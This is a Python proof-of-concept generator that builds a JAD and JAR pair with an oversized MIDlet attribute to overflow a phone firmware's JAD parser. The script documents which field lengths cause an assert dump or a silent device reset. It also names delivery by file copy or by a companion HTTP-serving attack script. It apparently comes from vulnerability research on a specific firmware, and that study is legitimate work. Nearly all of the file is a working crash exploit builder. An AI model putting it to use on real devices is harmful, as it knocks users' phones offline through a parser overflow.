#!/usr/bin/env python3
"""make_jad_jar.py -- build the JAD-overflow PoC pair: <name>.jad + <name>.jar

    ./make_jad_jar.py                       -> JetTest.jad / JetTest.jar, 257-byte vendor
    ./make_jad_jar.py --size 512            -> the variant that resets the phone
    ./make_jad_jar.py --field name --fill A -> different attribute, different fill byte
    ./make_jad_jar.py --list                -> show the parameter space, write nothing
    ./make_jad_jar.py --verify              -> rebuild and validate the archive bytes

Standard library only. It is the same tool as attacks/make_jad_jar.sh and
produces BYTE-IDENTICAL output to it (stored entries, fixed DOS timestamp), so
either can be used to reproduce the other. attacks/06_jar_jad_fuzz.py is the
older variant that needs attacks/lib/rbmx and deflates its entries.

WHY THE JAR CONTAINS .java AND NOT A .class
    No J2ME toolchain is available here, and it makes no difference: the fault
    is in parsing the JAD, which happens before any bytecode is loaded.

UNDO: nothing to undo. This writes two files into --out (default ./artifacts)
and touches no device, no COM port and no network. Pushing them to the phone is
a separate, deliberate step; the crash itself recovers with a power cycle.

EXIT CODES: 0 ok, 1 bad usage, 2 build/verification failure.
"""
import argparse
import os
import struct
import sys
import zipfile

VERSION = "make_jad_jar.py 1.0"

# Fixed timestamp so repeated runs -- and the bash twin -- produce identical
# bytes. 2009-07-10 16:55:34, the build date of the firmware under test.
DOS_TIME = (16 << 11) | (55 << 5) | (34 // 2)
DOS_DATE = ((2009 - 1980) << 9) | (7 << 5) | 10

MANIFEST = """Manifest-Version: 1.0
MIDlet-1: {name}, , {cls}
MIDlet-Name: {v_name}
MIDlet-Version: 1.0
MIDlet-Vendor: {v_vendor}
MicroEdition-Configuration: CLDC-1.1
MicroEdition-Profile: MIDP-2.0

"""

MIDLET = """
import javax.microedition.midlet.*;
import javax.microedition.lcdui.*;
public class {cls} extends MIDlet {{
    Display d;
    protected void startApp() {{
        d = Display.getDisplay(this);
        Form f = new Form("alive");
        f.append("reached startApp");
        d.setCurrent(f);
    }}
    protected void pauseApp() {{}}
    protected void destroyApp(boolean u) {{}}
}}
"""

LIST = """parameter space
  field=vendor       MIDlet-Vendor       displayed on the info screen
  field=name         MIDlet-Name         displayed
  field=description  MIDlet-Description  displayed, only after opening
  field=url          MIDlet-Jar-URL      never displayed

size ladder
  <=255  nothing happens
  257    assert reporter prints 11 pages (AcStrcpyEx, AcString.c:600)
  512    silent reset -- the reporter's own buffer dies first"""


def build_fields(name, size, field, fill, url=None):
    """Assign the JAD values, with the chosen one replaced by the pad string."""
    pad = (fill[:1] or "V") * max(0, size)
    val = {
        "vendor": "V",
        "name": name,
        "description": "d",
        "url": url if url is not None else name + ".jar",
    }
    val[field] = pad
    return val


def render_jad(name, cls, val):
    return (
        "MIDlet-1: %s, , %s\nMIDlet-Name: %s\nMIDlet-Version: 1.0\n"
        "MIDlet-Vendor: %s\nMIDlet-Description: %s\nMIDlet-Jar-URL: %s\n"
        "MIDlet-Jar-Size: 0\nMicroEdition-Configuration: CLDC-1.1\n"
        "MicroEdition-Profile: MIDP-2.0\n"
        % (name, cls, val["name"], val["vendor"], val["description"], val["url"])
    )


def write_zip(path, entries, deflate=True):
    """Write entries [(name, bytes)] with zipfile -- used only for --deflate.

    ZipFile forces external_attr = 0x0180 into the central directory, which is
    harmless but means these bytes differ from the hand-built writer. Stored
    output goes through write_stored_raw() instead, to stay identical to the
    bash twin.
    """
    method = zipfile.ZIP_DEFLATED if deflate else zipfile.ZIP_STORED
    with zipfile.ZipFile(path, "w", method) as z:
        for arcname, data in entries:
            zi = zipfile.ZipInfo(arcname, date_time=(2009, 7, 10, 16, 55, 34))
            zi.compress_type = method
            zi.create_system = 0
            zi.create_version = 20
            zi.extract_version = 20
            zi.external_attr = 0
            zi.internal_attr = 0
            zi.flag_bits = 0
            z.writestr(zi, data)
    return path


def write_stored_raw(path, entries):
    """Hand-built ZIP, the same bytes attacks/make_jad_jar.sh emits.

    Used for --raw, and as the fallback if ZipFile's defaults ever drift.
    """
    import zlib

    out = bytearray()
    central = bytearray()
    for arcname, data in entries:
        name = arcname.encode()
        crc = zlib.crc32(data) & 0xFFFFFFFF
        off = len(out)
        out += struct.pack(
            "<IHHHHHIIIHH", 0x04034B50, 20, 0, 0, DOS_TIME, DOS_DATE,
            crc, len(data), len(data), len(name), 0)
        out += name + data
        central += struct.pack(
            "<IHHHHHHIIIHHHHHII", 0x02014B50, 20, 20, 0, 0, DOS_TIME, DOS_DATE,
            crc, len(data), len(data), len(name), 0, 0, 0, 0, 0, off)
        central += name
    cd_off = len(out)
    out += central
    out += struct.pack("<IHHHHIIH", 0x06054B50, 0, 0,
                       len(entries), len(entries), len(central), cd_off, 0)
    with open(path, "wb") as f:
        f.write(bytes(out))
    return path


def verify(path, expect_names):
    """Re-read what we wrote and prove it is a valid archive."""
    try:
        with zipfile.ZipFile(path) as z:
            bad = z.testzip()
            if bad is not None:
                return "CRC mismatch in %s" % bad
            names = z.namelist()
    except Exception as exc:                      # noqa: BLE001 - report, do not raise
        return "not a valid zip: %s" % exc
    for want in expect_names:
        if want not in names:
            return "%s missing from the archive" % want
    return None


def main():
    ap = argparse.ArgumentParser(
        description="Build the JAD-overflow PoC pair (JAD + JAR), stdlib only.",
        epilog="UNDO: writes two files into --out; touches no device, port or network.")
    ap.add_argument("--name", default="JetTest", help="pair basename")
    ap.add_argument("--size", type=int, default=257,
                    help="length of the oversized field (257 = 11-page assert dump, "
                         "512 = silent reset, <=255 = normal)")
    ap.add_argument("--field", default="vendor",
                    choices=["vendor", "name", "description", "url"])
    ap.add_argument("--fill", default="V",
                    help="one padding character; the field is text, so no NULs -- "
                         "use it to tell a length-only fault from a content-dependent one")
    ap.add_argument("--class", dest="cls", default="FuzzMidlet")
    ap.add_argument("--out", default="artifacts")
    ap.add_argument("--url", default=None, help="override MIDlet-Jar-URL")
    ap.add_argument("--deflate", action="store_true",
                    help="compress entries with zipfile (matches 06_jar_jad_fuzz.py). "
                         "Default is stored, hand-built, byte-identical to "
                         "make_jad_jar.sh")
    ap.add_argument("--verify", action="store_true",
                    help="after writing, re-open and validate the archive")
    ap.add_argument("--list", action="store_true", help="print the parameter space and exit")
    ap.add_argument("--version", action="version", version=VERSION)
    a = ap.parse_args()

    if a.list:
        print(LIST)
        return 0
    if a.size < 0:
        ap.error("--size must not be negative")

    os.makedirs(a.out, exist_ok=True)
    val = build_fields(a.name, a.size, a.field, a.fill, a.url)

    jad_path = os.path.join(a.out, a.name + ".jad")
    jar_path = os.path.join(a.out, a.name + ".jar")
    with open(jad_path, "w", encoding="latin-1", newline="") as f:
        f.write(render_jad(a.name, a.cls, val))

    entries = [
        ("META-INF/MANIFEST.MF", MANIFEST.format(
            name=a.name, cls=a.cls, v_name=val["name"], v_vendor=val["vendor"]).encode()),
        (a.cls + ".java", MIDLET.format(cls=a.cls).encode()),
    ]
    if a.deflate:
        write_zip(jar_path, entries, deflate=True)
    else:
        write_stored_raw(jar_path, entries)

    print("wrote %s (%d bytes)" % (jad_path, os.path.getsize(jad_path)))
    print("wrote %s (%d bytes)" % (jar_path, os.path.getsize(jar_path)))
    print()
    print("field %-12s length %-4d fill %s (0x%02x)"
          % (a.field, a.size, a.fill[:1] or "V", ord(a.fill[:1] or "V")))
    print()
    print("next: push the pair to /User/Mass/Java/Games/%s/ and open the .jad," % a.name)
    print("      or serve it with attacks/09_jad_http.py for the no-cable route.")
    print("      recovery from the crash is a power cycle; nothing is written.")

    if a.verify:
        problem = verify(jar_path, ["META-INF/MANIFEST.MF", a.cls + ".java"])
        if problem:
            print("\nSELF-CHECK FAILED: %s" % problem, file=sys.stderr)
            return 2
        print("\nself-check: %s is a valid archive, CRCs verified"
              % os.path.basename(jar_path))
    return 0


if __name__ == "__main__":
    sys.exit(main())
